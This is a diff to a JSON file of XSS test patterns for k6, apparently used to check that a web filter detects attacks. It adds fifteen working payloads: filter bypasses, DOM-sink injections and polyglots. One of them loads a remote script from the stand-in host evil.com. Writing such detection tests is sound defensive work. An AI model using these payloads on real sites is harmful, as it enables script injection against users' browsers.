@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "xss",
-    "total_patterns": 41,
+    "total_patterns": 56,
     "port": 8002,
     "description": "k6 test patterns for xss"
   },
@@ -471,6 +471,186 @@
       "expected_detection": true,
       "severity": "high",
       "expected_rule": "DOM-based XSS Attack"
+    },
+    {
+      "id": "XSS_BYPASS_007",
+      "name": "SVG script href attribute",
+      "category": "xss",
+      "subcategory": "bypass",
+      "payload": "<svg><script href=data:,alert('XSS') />",
+      "encoded": "%3Csvg%3E%3Cscript%20href%3Ddata%3A%2Calert('XSS')%20%2F%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "XSS Filter Bypass Attempt"
+    },
+    {
+      "id": "XSS_BYPASS_008",
+      "name": "Object data URL injection",
+      "category": "xss",
+      "subcategory": "bypass",
+      "payload": "<object data='data:text/html,<script>alert(1)</script>'>",
+      "encoded": "%3Cobject%20data%3D'data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "XSS Filter Bypass Attempt"
+    },
+    {
+      "id": "XSS_BYPASS_009",
+      "name": "iframe srcdoc injection",
+      "category": "xss",
+      "subcategory": "bypass",
+      "payload": "<iframe srcdoc='<script>alert(1)</script>'>",
+      "encoded": "%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "XSS Filter Bypass Attempt"
+    },
+    {
+      "id": "XSS_BYPASS_010",
+      "name": "Meta refresh redirect",
+      "category": "xss",
+      "subcategory": "bypass",
+      "payload": "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+      "encoded": "%3Cmeta%20http-equiv%3D'refresh'%20content%3D'0%3Burl%3Djavascript%3Aalert(1)'%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "XSS Filter Bypass Attempt"
+    },
+    {
+      "id": "XSS_DOM_011",
+      "name": "DOM location hash injection",
+      "category": "xss",
+      "subcategory": "dom",
+      "payload": "location.hash=alert(1)//",
+      "encoded": "location.hash%3Dalert(1)%2F%2F",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "DOM-based XSS Attack"
+    },
+    {
+      "id": "XSS_DOM_012",
+      "name": "DOM document.write injection",
+      "category": "xss",
+      "subcategory": "dom",
+      "payload": "document.write('<script>alert(1)</script>')",
+      "encoded": "document.write('%3Cscript%3Ealert(1)%3C%2Fscript%3E')",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "DOM-based XSS Attack"
+    },
+    {
+      "id": "XSS_DOM_013",
+      "name": "DOM innerHTML injection",
+      "category": "xss",
+      "subcategory": "dom",
+      "payload": "element.innerHTML='<img src=x onerror=alert(1)>'",
+      "encoded": "element.innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "DOM-based XSS Attack"
+    },
+    {
+      "id": "XSS_DOM_014",
+      "name": "DOM outerHTML injection",
+      "category": "xss",
+      "subcategory": "dom",
+      "payload": "element.outerHTML='<img src=x onerror=alert(1)>'",
+      "encoded": "element.outerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "DOM-based XSS Attack"
+    },
+    {
+      "id": "XSS_DOM_015",
+      "name": "DOM insertAdjacentHTML injection",
+      "category": "xss",
+      "subcategory": "dom",
+      "payload": "insertAdjacentHTML('beforeend','<script>alert(1)</script>')",
+      "encoded": "insertAdjacentHTML('beforeend'%2C'%3Cscript%3Ealert(1)%3C%2Fscript%3E')",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "DOM-based XSS Attack"
+    },
+    {
+      "id": "XSS_POLY_002",
+      "name": "Polyglot script/style",
+      "category": "xss",
+      "subcategory": "polyglot",
+      "payload": "</style><script>alert(1)</script><style>",
+      "encoded": "%3C%2Fstyle%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3Cstyle%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Polyglot XSS Attack"
+    },
+    {
+      "id": "XSS_POLY_003",
+      "name": "Polyglot comment break",
+      "category": "xss",
+      "subcategory": "polyglot",
+      "payload": "--><script>alert(1)</script><!--",
+      "encoded": "--%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C!--",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Polyglot XSS Attack"
+    },
+    {
+      "id": "XSS_POLY_004",
+      "name": "Polyglot CDATA injection",
+      "category": "xss",
+      "subcategory": "polyglot",
+      "payload": "]]><script>alert(1)</script><![CDATA[",
+      "encoded": "%5D%5D%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C!%5BCDATA%5B",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Polyglot XSS Attack"
+    },
+    {
+      "id": "XSS_POLY_005",
+      "name": "Polyglot script src",
+      "category": "xss",
+      "subcategory": "polyglot",
+      "payload": "'><script src=//evil.com/x.js></script>",
+      "encoded": "'%3E%3Cscript%20src%3D%2F%2Fevil.com%2Fx.js%3E%3C%2Fscript%3E",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Polyglot XSS Attack"
+    },
+    {
+      "id": "XSS_POLY_006",
+      "name": "Polyglot onload img",
+      "category": "xss",
+      "subcategory": "polyglot",
+      "payload": "'/><img src=x onerror=alert(1) /><input type='hidden' value='",
+      "encoded": "'%2F%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%20%2F%3E%3Cinput%20type%3D'hidden'%20value%3D'",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Polyglot XSS Attack"
+    },
+    {
+      "id": "XSS_POLY_007",
+      "name": "Polyglot event handler",
+      "category": "xss",
+      "subcategory": "polyglot",
+      "payload": "jaVasCript:/*-/*`/*' /*onerror=alert(1)// */",
+      "encoded": "jaVasCript%3A%2F*-%2F*%60%2F*'%20%2F*onerror%3Dalert(1)%2F%2F%20*%2F",
+      "port": 8002,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "Advanced XSS Attack Attempt"
     }
   ]
 }
